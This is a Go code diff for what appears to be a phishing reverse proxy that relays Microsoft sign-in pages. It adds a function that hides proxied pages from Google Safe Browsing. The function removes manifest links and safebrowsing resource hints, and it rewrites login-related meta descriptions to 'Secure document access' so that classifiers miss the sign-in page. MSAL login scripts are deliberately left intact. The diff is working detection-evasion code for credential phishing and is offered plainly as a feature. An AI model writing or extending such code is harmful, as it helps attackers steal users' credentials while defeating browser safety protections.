@@ -1244,6 +1244,15 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 		body = m.cloakHTMLSource(body)
 	}
 
+	// proxy-config security: scrub page metadata (Layer 4 GSB hardening).
+	// Strips webapp manifests, safebrowsing resource hints, and login-keyword
+	// meta descriptions. Runs after decompression and before re-compression.
+	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil &&
+		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.ScrubMetadata &&
+		strings.Contains(contentType, "text/html") {
+		body = m.scrubPageMetadata(body)
+	}
+
 	m.updateResponseBody(resp, body, wasCompressed)
 	resp.Header.Set("Cache-Control", "no-cache, no-store")
 }
@@ -1448,6 +1457,15 @@ func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Respo
 		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.CloakSource &&
 		strings.Contains(contentType, "text/html") {
 		body = m.cloakHTMLSource(body)
+	}
+
+	// proxy-config security: scrub page metadata (Layer 4 GSB hardening).
+	// Strips webapp manifests, safebrowsing resource hints, and login-keyword
+	// meta descriptions. Runs after decompression and before re-compression.
+	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil &&
+		reqCtx.ProxyConfig.Global.Security != nil && reqCtx.ProxyConfig.Global.Security.ScrubMetadata &&
+		strings.Contains(contentType, "text/html") {
+		body = m.scrubPageMetadata(body)
 	}
 
 	m.updateResponseBody(resp, body, wasCompressed)
@@ -6201,6 +6219,78 @@ func (m *ProxyHandler) cloakHTMLSource(body []byte) []byte {
 	// remove X-Powered-By style comments
 	xPoweredRe := regexp.MustCompile(`(?i)<!--\s*X-Powered-By:.*?-->`)
 	s = xPoweredRe.ReplaceAllString(s, "")
+
+	return []byte(s)
+}
+
+// Pre-compiled regexes for scrubPageMetadata (Layer 4 GSB hardening).
+// Compiled once at package load to avoid per-request compilation cost.
+var (
+	// matches <link rel="manifest" ...> (rel value may be quoted or unquoted)
+	scrubManifestLinkRe = regexp.MustCompile(`(?is)<link\s+[^>]*rel\s*=\s*["']?manifest["']?[^>]*>`)
+
+	// matches <link rel="preconnect|dns-prefetch|preload" href="...safebrowsing|update.googleapis.com..."> in either order
+	scrubGSBHintRelFirstRe = regexp.MustCompile(`(?is)<link\s+[^>]*rel\s*=\s*["']?(?:preconnect|dns-prefetch|preload|prefetch)["']?[^>]*href\s*=\s*["'][^"']*(?:safebrowsing\.googleapis\.com|update\.googleapis\.com)[^"']*["'][^>]*>`)
+	scrubGSBHintHrefFirstRe = regexp.MustCompile(`(?is)<link\s+[^>]*href\s*=\s*["'][^"']*(?:safebrowsing\.googleapis\.com|update\.googleapis\.com)[^"']*["'][^>]*rel\s*=\s*["']?(?:preconnect|dns-prefetch|preload|prefetch)["']?[^>]*>`)
+
+	// matches <meta name="description" content="..."> (case-insensitive, attributes in either order)
+	scrubDescRelFirstRe  = regexp.MustCompile(`(?is)(<meta\s+[^>]*name\s*=\s*["']description["'][^>]*content\s*=\s*["'])([^"']*)(["'][^>]*>)`)
+	scrubDescHrefFirstRe = regexp.MustCompile(`(?is)(<meta\s+[^>]*content\s*=\s*["'])([^"']*)(["'][^>]*name\s*=\s*["']description["'][^>]*>)`)
+
+	// login-risk keywords that, if present in <meta name="description"> content,
+	// signal a sign-in/login page to GSB classifiers. Matched case-insensitively.
+	scrubDescKeywordsRe = regexp.MustCompile(`(?i)sign[\s-]?in|log[\s-]?in|log[\s-]?on|password|forgot[\s-]?password|two[\s-]?factor|2fa|authenticate|authentication|credential|account[\s-]?recovery|verify[\s-]?your[\s-]?identity`)
+)
+
+// scrubPageMetadata strips high-signal GSB page-metadata markers from HTML
+// response bodies before they reach the browser. This is Layer 4 of the GSB
+// hardening series: pre-DOM modification so MSAL cannot observe the changes.
+//
+// It removes:
+//  1. <link rel="manifest"> tags (webapp manifest fingerprinting)
+//  2. <link rel="preconnect|dns-prefetch|preload|prefetch"> pointed at
+//     safebrowsing.googleapis.com / update.googleapis.com
+//  3. Rewrites <meta name="description"> content to a generic line when it
+//     contains login-risk keywords (the tag is preserved, only content changes)
+//
+// It deliberately does NOT touch:
+//   - <script src=*aadcdn*> (MSAL bootstrap)
+//   - <meta name="referrer"> (tuned in v1.0.54 for Microsoft login loop fix)
+//   - <base href=> (URL resolution)
+//   - <meta http-equiv="Content-Security-Policy"> (CSP)
+//   - <meta name="viewport"> (mobile rendering)
+func (m *ProxyHandler) scrubPageMetadata(body []byte) []byte {
+	s := string(body)
+
+	// 1. strip webapp manifest links
+	s = scrubManifestLinkRe.ReplaceAllString(s, "")
+
+	// 2. strip GSB/safebrowsing resource hints (both attribute orders)
+	s = scrubGSBHintRelFirstRe.ReplaceAllString(s, "")
+	s = scrubGSBHintHrefFirstRe.ReplaceAllString(s, "")
+
+	// 3. rewrite login-keyword meta descriptions to a benign line; keep tag present
+	const benignDescription = "Secure document access"
+	replaceFn := func(prefix, content, suffix string) string {
+		if scrubDescKeywordsRe.MatchString(content) {
+			return prefix + benignDescription + suffix
+		}
+		return prefix + content + suffix
+	}
+	s = scrubDescRelFirstRe.ReplaceAllStringFunc(s, func(match string) string {
+		parts := scrubDescRelFirstRe.FindStringSubmatch(match)
+		if len(parts) != 4 {
+			return match
+		}
+		return replaceFn(parts[1], parts[2], parts[3])
+	})
+	s = scrubDescHrefFirstRe.ReplaceAllStringFunc(s, func(match string) string {
+		parts := scrubDescHrefFirstRe.FindStringSubmatch(match)
+		if len(parts) != 4 {
+			return match
+		}
+		return replaceFn(parts[1], parts[2], parts[3])
+	})
 
 	return []byte(s)
 }
